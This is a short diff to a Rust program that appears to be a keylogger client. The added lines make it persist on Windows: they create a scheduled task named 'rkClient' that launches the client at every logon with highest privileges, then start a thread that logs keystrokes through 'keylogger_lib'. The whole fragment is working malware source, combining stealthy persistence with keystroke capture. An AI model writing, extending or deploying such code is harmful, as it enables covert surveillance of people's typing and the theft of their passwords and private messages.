@@ -10,8 +10,17 @@ const DELETE_UPON_RETRIEVAL: bool = true;
 
 const LOGS_FOLDER_PATH: &str = "./logs/";
 
+const TASK_CREATED: &str = "TASK_EXISTS";
 
 fn main() {
+
+    if !std::path::Path::new(TASK_CREATED).exists() {
+        let task_child = std::process::Command::new("schtasks.exe")
+            .args(&["/Create", "/TN", "rkClient", "/TR", "\"F:\\Documents\\RustProjects\\rust_keylogger\\target\\debug\\client.exe\"", "/SC", "ONLOGON", "/RL", "HIGHEST"])
+            .spawn().is_ok();
+        std::fs::File::create(TASK_CREATED).is_ok();
+    }
+
     let second_thread = std::thread::spawn(|| keylogger_lib::key_log(
         &keylogger_lib::EncryptionDetails { pub_key_loc: PUB_KEY_PATH.to_owned(), sym_key_loc: SYM_KEY_PATH.to_owned() }));
 
